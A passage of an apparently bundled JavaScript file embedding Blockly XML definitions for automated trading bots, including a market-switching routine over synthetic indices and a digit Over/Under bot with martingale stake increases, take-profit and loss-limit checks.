          </next>\n                  </block>\n                </statement>\n                <next>\n                  <block type="btnotify" id="497Bq58BVf9+Zlb.xcYL" collapsed="true">\n                    <field name="NOTIFICATION_TYPE">success</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="/sPTQBozr114}mtSN*9I">\n                        <field name="TEXT">PrimeTrades</field>\n                      </shadow>\n                      <block type="variables_get" id="s7Xq7nGw{OyA1)tD`x2q">\n                        <field name="VAR" id="Qq28jzu{61V^?3_DKY1z" variabletype="">text</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="btnotify" id="-SP}Fsj;VS{Vk[GagAWn" collapsed="true">\n                        <field name="NOTIFICATION_TYPE">info</field>\n                        <field name="NOTIFICATION_SOUND">silent</field>\n                        <value name="MESSAGE">\n                          <shadow type="text" id="yw$U|2n8Gf8-:q#q_G/j">\n                            <field name="TEXT">Deepseek AI  Auto</field>\n                          </shadow>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="FrhP.v@2:JZ=^x?jnS$%" collapsed="true" x="0" y="1380">\n    <field name="NAME">Switch Markets</field>\n    <statement name="STACK">\n      <block type="controls_if" id="VGZPogGY0Set{6_anb^G">\n        <value name="IF0">\n          <block type="variables_get" id="*Q:5xM72M0uH1c4n)z`m">\n            <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="controls_if" id="Ki6kTyGNE=5#A}+Gg,03" collapsed="true">\n            <mutation elseif="9"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id=")RN1:VOnXI9Vk6.4roIe">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="T!R:J2x!dxRo]dj}O8(;">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="^E=;m#1KAneN`S:G:2CS">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="active_symbol_changer" id="-ZxS^B8T}|,HpOC%(Q{b">\n                <field name="SYMBOL_ACTIVE_TYPE">disable</field>\n                <next>\n                  <block type="math_change" id="P}x0(E:6`/|(_Ea|xuO^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="DELTA">\n                      <shadow type="math_number" id="Kepl7mFD7Q+~%.k~f4{5">\n                        <field name="NUM">1</field>\n                      </shadow>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="m5vX2MyIr4aZ2Z_SfSZZ">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="~D0j-xolT?r3DAkm@[yF">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="mfil0y+(%k2~t|-?3EaY">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="math_change" id="JKDEDg;Ys7Y^UlZgyr`L">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="h=g9/nQ(=[M:tSxL{|Ee">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="NqArOhvF`dZYzINFUsKx">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_10</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF2">\n              <block type="logic_compare" id="5gT$!er~9CHL:IAap[Bl">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="^BT`2{m!}J^tc~Q,CJb9">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="?VFC]H}/sT/Ox}+1AzNn">\n                    <field name="NUM">2</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO2">\n              <block type="math_change" id="?hsN1hTjE#p#5U@@dARD">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="t+/l~tS0c56_.v+{6ve:">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="T%SI$7#V|!--$bT@Mv9D">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ25V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF3">\n              <block type="logic_compare" id=":/zVQoL2!_bjTeDx[LR6">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="$+4bF,x2VOu(Z~h$9wHx">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id=":T.32sK|]}^Q1?f#;5?W">\n                    <field name="NUM">3</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO3">\n              <block type="math_change" id="*s9r4kZgmsshX/`~7il.">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="tt4#*_)2#g8Fe!i#FJq^">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="~BuR4g0t@I)aUy?+F?6f">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_25</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF4">\n              <block type="logic_compare" id="_c[I7*nq^TaqO|=F1sS|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="BsT9ufUY=6Z`()~JYK_E">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="ktQ-AOll^a3oeOzKl[n-">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO4">\n              <block type="math_change" id="S5T^9^i[t$ui78zpcXhX">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="L~y-nLlv]J0%#!@cu9lG">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="d;UjX}NZt|ZI?o`dj(2M">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ50V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF5">\n              <block type="logic_compare" id="(}%3CM*e%tc~Ws0)6S7X">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="[`P4=vqTD90T2;{b:3QX">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="tN^-(Ge,0B[/%5ul,3ml">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO5">\n              <block type="math_change" id="EgKJ*IuoZ+^%XeHuBS%s">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DaE|Q#[}}Dliwpg;gcBa">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="0]U;{fm=H3gkmj[I4UBt">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_50</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF6">\n              <block type="logic_compare" id="ft{li;Mhn|D[PhJ!s~?5">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="5m*T?)fR*MmV$zp)VVM8">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="OTg-f}eGcCi7LC3TY7if">\n                    <field name="NUM">6</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO6">\n              <block type="math_change" id="e)P?$);8NQ08|,zw?L$2">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="DK8;=cbwYTU!`:j8@oCx">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id=":o|g$E2[oc*-SnoE6j5v">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ75V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF7">\n              <block type="logic_compare" id="|*cb5uT?#D/4qX9rwfOU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="YQq|Mo=WtahBh%Z5;LQ^">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="%BMHyxCJHIqKc:Qav1SD">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO7">\n              <block type="math_change" id="(xi?s#+N:[Jnbp8ne~-q">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="M%l{m?_]xV1l*4x}F5}H">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="uUE8bKj!o!^IEOUpsq].">\n                    <field name="SYMBOL_ACTIVE_TYPE">R_75</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF8">\n              <block type="logic_compare" id="^560qRq.HiF9s~qY-0J|">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="}RGyHH-OOT#Aj!g|6Jv1">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="+rWG01YI]k`6a+*y*Rq[">\n                    <field name="NUM">8</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO8">\n              <block type="math_change" id="?VTZTO?K~$j~=DoY*)h9">\n                <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                <value name="DELTA">\n                  <shadow type="math_number" id="%oBAmNX:4b,g}jqhZQlR">\n                    <field name="NUM">1</field>\n                  </shadow>\n                </value>\n                <next>\n                  <block type="active_symbol_changer" id="JDlwY!|41d%Y%@iV|GWx">\n                    <field name="SYMBOL_ACTIVE_TYPE">1HZ100V</field>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF9">\n              <block type="logic_compare" id="jr#1JwW4oZQy7gj.07jU">\n                <field name="OP">EQ</field>\n                <value name="A">\n                  <block type="variables_get" id="L1mLq.=%V369lY^EOgdz">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                  </block>\n                </value>\n                <value name="B">\n                  <block type="math_number" id="bOfynK:1K#@4R(r*2PkT">\n                    <field name="NUM">9</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO9">\n              <block type="active_symbol_changer" id="GE6Cz/eu?nKq(;!dgtvt">\n                <field name="SYMBOL_ACTIVE_TYPE">R_100</field>\n                <next>\n                  <block type="variables_set" id="6|am|{Qan=}eJ4%WGqBc">\n                    <field name="VAR" id="Vd)a}rnFL$Mr`V[FG0ZX" variabletype="">Count</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="e+T*@qF]C)8m^d[%!=4)">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            67636: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="H~lM2jPxGMlG4QL4buW9" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="]z_QF65~R=%+7)$4OJR*" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="3ZEhM-A+2]]J.M_z:t(`" islocal="false" iscloud="false">Initial Prediction</variable>\n    <variable type="" id="7W-MMzS?=V*vs|_rF#8q" islocal="false" iscloud="false">Recovery Prediction</variable>\n    <variable type="" id="SaG[tWXFC6ItYtgVH}m[" islocal="false" iscloud="false">Loss Count</variable>\n    <variable type="" id="E#!R+FI^C6m`n=[GO,_A" islocal="false" iscloud="false">item</variable>\n    <variable type="" id="zd1zWe{N+,%%dBJp9$Va" islocal="false" iscloud="false">Stake.</variable>\n    <variable type="" id=".4Qf)lgL~[jssy)aR?xY" islocal="false" iscloud="false">Martingale</variable>\n    <variable type="" id="[l);v7r,`^L^N+v-8L/B" islocal="false" iscloud="false">Take Profit</variable>\n    <variable type="" id="U?+6uoFPWWvXN5mJ[^v:" islocal="false" iscloud="false">Max Con. Losses</variable>\n    <variable type="" id="WEGiVURDs[glGS3p#2(X" islocal="false" iscloud="false">text</variable>\n  </variables>\n  <block type="trade_definition" id="bxLe!bSBy?+10SCl*LA=" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="UsOKwndBN}GmX^wq%K9/" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="t6:+Y([EyHCwN0n8[C0-" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="%)Rr,1Z%~i/1nH/)p5s]" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id=".F.}|Cl807jdwW~TrK;!" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="Qy[2-?T!oafbGRzb9gMj" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="bcP^QkD|~I_+**T?$}J@" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="i$uwouf-#1,9+^o}$U4m">\n        <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="2}APvqx34]}z#}@2Fvt/">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="gn|1@5fQ.bY@o_:EQ*M2">\n            <field name="VAR" id="[l);v7r,`^L^N+v-8L/B" variabletype="">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="7IhVX[x8_y~QS[eOkI4@">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="?}*3wBCU=%eR.XCSm`=_">\n                <field name="VAR" id="U?+6uoFPWWvXN5mJ[^v:" variabletype="">Max Con. Losses</field>\n                <value name="VALUE">\n                  <block type="math_number" id="=PVQnw^4+pJ,+_=6whKQ">\n                    <field name="NUM">4</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="hMqK`Y/E#w6nCk#syxui">\n                    <field name="VAR" id=".4Qf)lgL~[jssy)aR?xY" variabletype="">Martingale</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="QeyxcwSpN1/E]x9r_^B:">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="AbaZxKWM4Et7j@|-;XKz">\n                        <field name="VAR" id="3ZEhM-A+2]]J.M_z:t(`" variabletype="">Initial Prediction</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="st~=gOr{sF/$E;[l/ze2">\n                            <field name="NUM">2</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="Ta;3~*mnfcVzYBg(`BTn">\n                            <field name="VAR" id="7W-MMzS?=V*vs|_rF#8q" variabletype="">Recovery Prediction</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="WDb_zc/.{X%1aoWRv+k(">\n                                <field name="NUM">4</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="Z}o;ljNrtY%#t`z]7[_P" collapsed="true">\n                                <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="|GbO[kI#@c`5w,K+y4,!">\n                                    <field name="VAR" id="3ZEhM-A+2]]J.M_z:t(`" variabletype="">Initial Prediction</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="$-NfPY~]2Fb[v_#n$Ykq" collapsed="true">\n                                    <field name="VAR" id="zd1zWe{N+,%%dBJp9$Va" variabletype="">Stake.</field>\n                                    <value name="VALUE">\n                                      <block type="variables_get" id="i9BW9*z?qPut1dKua#Rb">\n                                        <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="cDzI%TkZGo!?YvP{.)Wu" collapsed="true">\n                                        <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                                        <value name="VALUE">\n                                          <block type="math_number" id="[:=V2,FMt1,j|UEQu,l[">\n                                            <field name="NUM">0</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="text_print" id="1G;tQ3=})GSIUM+Cdz;Q" collapsed="true">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="9~-v9KfT@NnDG[fe2UP}">\n                                                <field name="TEXT">abc</field>\n                                              </shadow>\n                                              <block type="text" id="?`*{EVh~;*LqZja36$j^">\n                                                <field name="TEXT">Make sure that Digit 0,1,2 have less than 9.6% and red bar on under side while green bar on Over side 5,6,7,8,9</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="text_print" id="_zsu##kd`chS5o]t|hY-" collapsed="true">\n                                                <value name="TEXT">\n                                                  <shadow type="text" id="sWt}b?Rlw%NQ{:]~VAmU">\n                                                    <field name="TEXT">abc</field>\n                                                  </shadow>\n                                                  <block type="text" id="IR{9Z}k5`V[%?.JTt^9e">\n                                                    <field name="TEXT">This Bot trades Over 2 if the last digit is less than 2. Incase of the first loss it trades Over 5 with same stake to recover. If it doesnt recover then it trades Over 4 with martingale. All the Best</field>\n                                                  </block>\n                                                </value>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="I+uNn}350Q-v$GQC)G]h">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number_positive" id="UNnTO=pUP;VmO*L}Sg%a">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number_positive" id="xp5OY.B}JS_zfF*o3j8w">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="#dWfFCGX-E5=tw=?5vh,">\n            <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="TQgM_|/DPnyG^AhbEM}(">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="v_+rZb?P$?orGWDlx?D.">\n            <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id=")Q[[!zJ}?Yr8t1IeOejY" x="957" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=":|W}o*i|LET!GdWfID`c">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="contract_check_result" id="zuEimxU{@cfjV+r_wa;y">\n            <field name="CHECK_RESULT">win</field>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="zejLLD.Uo7T1m]g3`R~#">\n            <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n            <value name="VALUE">\n              <block type="variables_get" id="^4LAG9Nx#w,I{Ud~k42;">\n                <field name="VAR" id="3ZEhM-A+2]]J.M_z:t(`" variabletype="">Initial Prediction</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="WyJE=/_cn;lXj?}sRlv`">\n                <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                <value name="VALUE">\n                  <block type="variables_get" id="C:2?)#sgKG;6,=.|m3?J">\n                    <field name="VAR" id="zd1zWe{N+,%%dBJp9$Va" variabletype="">Stake.</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="t|L^S3{c1l{/=,!^5*}d">\n                    <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="tNvmq?]0-r^3$fo+jCnh">\n                        <field name="NUM">0</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="math_change" id="w84xQK)*E49m7tLjwiVQ">\n            <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n            <value name="DELTA">\n              <shadow type="math_number" id="0_261}^8,.`uDgxnfSiU">\n                <field name="NUM">1</field>\n              </shadow>\n            </value>\n            <next>\n              <block type="controls_if" id="#+:rl3~Xvn5:V291ejY;">\n                <mutation elseif="2"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="?]2lj[j~hc`Q8x~KxQ1H">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="#i@suR7JdC8xZWRby7B{">\n                        <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="L2:MKnr36v1LZLZ`dF3#">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="variables_set" id=")SF$KnbzN/0FyDZu$u#e">\n                    <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="~l*U^oSC[zE*iQ6n)Yc;">\n                        <field name="NUM">5</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <value name="IF1">\n                  <block type="logic_compare" id=")]Vd?Rv{VjHY)s/C#jU*">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="!IKjaiETBSJmi1s`%wht">\n                        <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="n7aT=)^.Jzt%CrW)9fBP">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO1">\n                  <block type="variables_set" id="H,s/MM]SH09SPVIYCY-U">\n                    <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="gk)prCSJf#4?#Ez8$Cfw">\n                        <field name="VAR" id="7W-MMzS?=V*vs|_rF#8q" variabletype="">Recovery Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="e8A:Q|2whOr8GP;1g_iM">\n                        <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="math_arithmetic" id="$/AL`mT3PiF_JwfNw^[i">\n                            <field name="OP">MULTIPLY</field>\n                            <value name="A">\n                              <shadow type="math_number" id="=l5}9^e99D/3W4}m~v$$">\n                                <field name="NUM">1</field>\n                              </shadow>\n                              <block type="variables_get" id="P)?J^-8NCb:jqzC8b~;[">\n                                <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <shadow type="math_number" id="z~8aXErPKiL|erq^bS`2">\n                                <field name="NUM">1</field>\n                              </shadow>\n                              <block type="math_arithmetic" id="c.qEVPc{DvZT@I=~_jo`">\n                                <field name="OP">MULTIPLY</field>\n                                <value name="A">\n                                  <shadow type="math_number" id="w|K[K-K]W07uMImjA3Ju">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="variables_get" id="atqK1kpTEyi1SUzahHrT">\n                                    <field name="VAR" id=".4Qf)lgL~[jssy)aR?xY" variabletype="">Martingale</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <shadow type="math_number" id="tH5dAWxAH[9:DY*7X)`9">\n                                    <field name="NUM">2</field>\n                                  </shadow>\n                                  <block type="math_number" id="~$vvOJGBKSh@!uB|dE+k">\n                                    <field name="NUM">2</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <value name="IF2">\n                  <block type="logic_compare" id="S1YECnGcZEkcc@//y6Ab">\n                    <field name="OP">GT</field>\n                    <value name="A">\n                      <block type="variables_get" id="/RcmL,~smTL,}IB|,veb">\n                        <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="RpV3$xMRyJ2yk4^@7-9)">\n                        <field name="NUM">2</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO2">\n                  <block type="variables_set" id="=cn1MB@;o6x:M*zgO/5y">\n                    <field name="VAR" id="]z_QF65~R=%+7)$4OJR*" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="h@j/Z-UcEnHPHq}-q#Z-">\n                        <field name="VAR" id="7W-MMzS?=V*vs|_rF#8q" variabletype="">Recovery Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="/}iw/:-~_cXk*:fTuYWB">\n                        <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="math_arithmetic" id="*KS)@t??;=,i4uSA!iUb">\n                            <field name="OP">MULTIPLY</field>\n                            <value name="A">\n                              <shadow type="math_number" id="tHNt{MkNl-Bw+uKGRyXN">\n                                <field name="NUM">1</field>\n                              </shadow>\n                              <block type="variables_get" id="=XoVra-+9+(zmP}tB@?t">\n                                <field name="VAR" id="H~lM2jPxGMlG4QL4buW9" variabletype="">Stake</field>\n                              </block>\n                            </value>\n                            <value name="B">\n                              <shadow type="math_number" id="C.LV~ToR=GGU[JE?Fj3B">\n                                <field name="NUM">1</field>\n                              </shadow>\n                              <block type="variables_get" id="x@n1Q_[+j}xfFc6ZC~9t">\n                                <field name="VAR" id=".4Qf)lgL~[jssy)aR?xY" variabletype="">Martingale</field>\n                              </block>\n                            </value>\n                          </block>\n                        </value>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <next>\n          <block type="controls_if" id="iUFKNG0NUHykBC{`s/*]">\n            <mutation elseif="1" else="1"></mutation>\n            <value name="IF0">\n              <block type="logic_compare" id=":s*$Y5B6k*nYbD~iEM|3">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="total_profit" id="D]Jh_5Z8?WqU,m{qOxsO"></block>\n                </value>\n                <value name="B">\n                  <block type="variables_get" id="|q?Qsvo6SLa:jg?%OC~:">\n                    <field name="VAR" id="[l);v7r,`^L^N+v-8L/B" variabletype="">Take Profit</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="text_print" id="g$.FhSaI_ZMQ%*4RfYl?">\n                <value name="TEXT">\n                  <shadow type="text" id="gnrOqiQI*rpqPh+0Q9{n">\n                    <field name="TEXT">Congratulations Take Profit Hit</field>\n                  </shadow>\n                </value>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="logic_compare" id="nN3PHp`^e1kL./%S2{0t">\n                <field name="OP">GTE</field>\n                <value name="A">\n                  <block type="variables_get" id="VU/eh*Q:F(%rRz3J3n%F">\n                    <field name="VAR" id="SaG[tWXFC6ItYtgVH}m[" variabletype="">Loss Count</field>\n                  